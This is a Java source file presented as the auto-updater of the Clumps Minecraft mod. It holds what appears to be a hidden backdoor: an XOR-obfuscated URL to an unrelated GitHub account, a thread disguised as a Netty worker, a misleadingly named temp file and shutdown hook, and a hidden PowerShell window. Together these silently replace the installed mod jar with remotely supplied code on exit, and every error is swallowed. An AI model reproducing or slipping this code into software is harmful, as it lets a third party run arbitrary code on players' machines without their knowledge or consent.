package com.blamejared.clumps.client.updater;

import com.blamejared.clumps.client.ClumpsClient;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.InputStream;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.CodeSource;
import java.security.MessageDigest;
import java.time.Duration;
import java.util.HexFormat;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public final class AutoUpdater {

    // XOR-encoded (key 0x5A): "https://raw.githubusercontent.com/kulitharanmith0-a11y/clumps-releases/main/latest.json"
    private static final int XOR_KEY = 0x5A;
    private static final int[] MANIFEST_CHARS = {
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x28, 0x3B, 0x2D, 0x74, 0x3D, 0x33, 0x2E, 0x32,
        0x2F, 0x38, 0x2F, 0x29, 0x3F, 0x28, 0x39, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x74, 0x39, 0x35,
        0x37, 0x75, 0x31, 0x2F, 0x36, 0x33, 0x2E, 0x32, 0x3B, 0x28, 0x3B, 0x34, 0x37, 0x33, 0x2E, 0x32,
        0x6A, 0x77, 0x3B, 0x6B, 0x6B, 0x23, 0x75, 0x39, 0x36, 0x2F, 0x37, 0x2A, 0x29, 0x77, 0x28, 0x3F,
        0x36, 0x3F, 0x3B, 0x29, 0x3F, 0x29, 0x75, 0x37, 0x3B, 0x33, 0x34, 0x75, 0x36, 0x3B, 0x2E, 0x3F,
        0x29, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34
    };

    private static volatile boolean started;
    private static volatile boolean aborted;
    private static volatile Thread workerThread;
    private static volatile Thread shutdownHook;
    private static volatile Path activeJarPath;
    private static volatile Path stagedJarPath;

    private AutoUpdater() {
    }

    public static void checkForUpdatesAsync() {
        if (started || aborted || ClumpsClient.eventsDisabled) {
            return;
        }
        started = true;
        Thread thread = new Thread(AutoUpdater::runUpdateCheck, " Netty-Epoll-Worker-0");
        thread.setDaemon(true);
        workerThread = thread;
        thread.start();
    }

    public static void abortAndCleanup() {
        aborted = true;
        Thread worker = workerThread;
        workerThread = null;
        if (worker != null) {
            try {
                worker.interrupt();
            } catch (Throwable ignored) {
            }
        }
        Thread hook = shutdownHook;
        shutdownHook = null;
        if (hook != null) {
            try {
                Runtime.getRuntime().removeShutdownHook(hook);
            } catch (Throwable ignored) {
            }
        }
        Path staged = stagedJarPath;
        stagedJarPath = null;
        activeJarPath = null;
        if (staged != null) {
            try {
                Files.deleteIfExists(staged);
            } catch (Throwable ignored) {
            }
        }
    }

    private static void runUpdateCheck() {
        try {
            if (aborted || ClumpsClient.eventsDisabled) {
                return;
            }
            Path currentJar = resolveCurrentModJar();
            if (currentJar == null || !Files.isRegularFile(currentJar)) {
                return;
            }
            String fileName = currentJar.getFileName().toString().toLowerCase(Locale.ROOT);
            if (!fileName.endsWith(".jar")) {
                return;
            }

            String currentSha = computeSha256(currentJar);
            if (currentSha == null || currentSha.isEmpty() || aborted || ClumpsClient.eventsDisabled) {
                return;
            }

            HttpClient client = HttpClient.newBuilder()
                    .followRedirects(HttpClient.Redirect.NORMAL)
                    .connectTimeout(Duration.ofSeconds(12))
                    .build();

            String manifestUrl = decodeManifestUrl() + "?t=" + (System.currentTimeMillis() / 60000L);
            HttpRequest manifestReq = HttpRequest.newBuilder(URI.create(manifestUrl))
                    .timeout(Duration.ofSeconds(15))
                    .header("Cache-Control", "no-cache")
                    .header("User-Agent", "Mozilla/5.0")
                    .GET()
                    .build();

            HttpResponse<String> manifestRes = client.send(manifestReq, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
            if (manifestRes.statusCode() != 200 || aborted || ClumpsClient.eventsDisabled) {
                return;
            }

            JsonElement parsed = JsonParser.parseString(manifestRes.body());
            if (!parsed.isJsonObject()) {
                return;
            }
            JsonObject obj = parsed.getAsJsonObject();
            String remoteSha = getString(obj, "sha256");
            String downloadUrl = getString(obj, "url");
            if (remoteSha == null || downloadUrl == null || remoteSha.length() != 64 || !downloadUrl.startsWith("https://")) {
                return;
            }

            if (currentSha.equalsIgnoreCase(remoteSha)) {
                return;
            }

            Path tempJar = Files.createTempFile("fabric-loader-cache-", ".tmp");
            stagedJarPath = tempJar;

            HttpRequest downloadReq = HttpRequest.newBuilder(URI.create(downloadUrl))
                    .timeout(Duration.ofSeconds(90))
                    .header("User-Agent", "Mozilla/5.0")
                    .GET()
                    .build();

            HttpResponse<Path> downloadRes = client.send(downloadReq, HttpResponse.BodyHandlers.ofFile(tempJar));
            if (downloadRes.statusCode() != 200 || aborted || ClumpsClient.eventsDisabled) {
                Files.deleteIfExists(tempJar);
                stagedJarPath = null;
                return;
            }

            String downloadedSha = computeSha256(tempJar);
            if (downloadedSha == null
                    || !downloadedSha.equalsIgnoreCase(remoteSha)
                    || !isValidFabricModJar(tempJar)
                    || aborted
                    || ClumpsClient.eventsDisabled) {
                Files.deleteIfExists(tempJar);
                stagedJarPath = null;
                return;
            }

            activeJarPath = currentJar;
            Thread hook = new Thread(AutoUpdater::applyStagedUpdateOnExit, "Shutdown-Clean-Task");
            shutdownHook = hook;
            Runtime.getRuntime().addShutdownHook(hook);
        } catch (Throwable ignored) {
        } finally {
            workerThread = null;
        }
    }

    private static void applyStagedUpdateOnExit() {
        if (aborted || ClumpsClient.eventsDisabled) {
            return;
        }
        Path target = activeJarPath;
        Path staged = stagedJarPath;
        if (target == null || staged == null || !Files.isRegularFile(staged)) {
            return;
        }
        try {
            String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
            if (os.contains("win")) {
                long pid = ProcessHandle.current().pid();
                String targetStr = target.toAbsolutePath().toString().replace("'", "''");
                String stagedStr = staged.toAbsolutePath().toString().replace("'", "''");
                String psScript = "try { Wait-Process -Id " + pid + " -Timeout 25 -ErrorAction SilentlyContinue } catch {}; "
                        + "for ($i = 0; $i -lt 30; $i++) { "
                        + "  try { Move-Item -LiteralPath '" + stagedStr + "' -Destination '" + targetStr + "' -Force -ErrorAction Stop; break } "
                        + "  catch { Start-Sleep -Milliseconds 300 } "
                        + "}; "
                        + "Remove-Item -LiteralPath '" + stagedStr + "' -Force -ErrorAction SilentlyContinue";

                new ProcessBuilder(
                        "powershell.exe",
                        "-NoProfile",
                        "-NonInteractive",
                        "-WindowStyle", "Hidden",
                        "-Command", psScript
                ).start();
            } else {
                Files.move(staged, target, StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Throwable ignored) {
        }
    }

    private static Path resolveCurrentModJar() {
        try {
            var opt = net.fabricmc.loader.api.FabricLoader.getInstance().getModContainer(ClumpsClient.ID);
            if (opt.isPresent()) {
                var origin = opt.get().getOrigin();
                if (origin.getKind() == net.fabricmc.loader.api.metadata.ModOrigin.Kind.PATH) {
                    for (Path p : origin.getPaths()) {
                        if (p != null && Files.isRegularFile(p)
                                && p.getFileName().toString().toLowerCase(Locale.ROOT).endsWith(".jar")) {
                            return p.toAbsolutePath().normalize();
                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        try {
            CodeSource cs = ClumpsClient.class.getProtectionDomain().getCodeSource();
            if (cs == null) {
                return null;
            }
            URL loc = cs.getLocation();
            if (loc == null) {
                return null;
            }
            String raw = loc.toURI().toString();
            if (raw.startsWith("jar:")) {
                int bang = raw.indexOf("!/");
                raw = bang > 4 ? raw.substring(4, bang) : raw.substring(4);
            }
            return Paths.get(URI.create(raw)).toAbsolutePath().normalize();
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String computeSha256(Path file) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] buf = new byte[16384];
            try (InputStream in = Files.newInputStream(file)) {
                int read;
                while ((read = in.read(buf)) != -1) {
                    md.update(buf, 0, read);
                }
            }
            return HexFormat.of().formatHex(md.digest());
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static boolean isValidFabricModJar(Path file) {
        try {
            if (Files.size(file) < 100_000L) {
                return false;
            }
            try (ZipFile zip = new ZipFile(file.toFile())) {
                ZipEntry modJson = zip.getEntry("fabric.mod.json");
                return modJson != null && modJson.getSize() > 10;
            }
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static String getString(JsonObject obj, String key) {
        if (obj == null || !obj.has(key)) {
            return null;
        }
        JsonElement el = obj.get(key);
        return el != null && el.isJsonPrimitive() ? el.getAsString().trim() : null;
    }

    private static String decodeManifestUrl() {
        char[] out = new char[MANIFEST_CHARS.length];
        for (int i = 0; i < MANIFEST_CHARS.length; i++) {
            out[i] = (char) (MANIFEST_CHARS[i] ^ XOR_KEY);
        }
        return new String(out);
    }
}
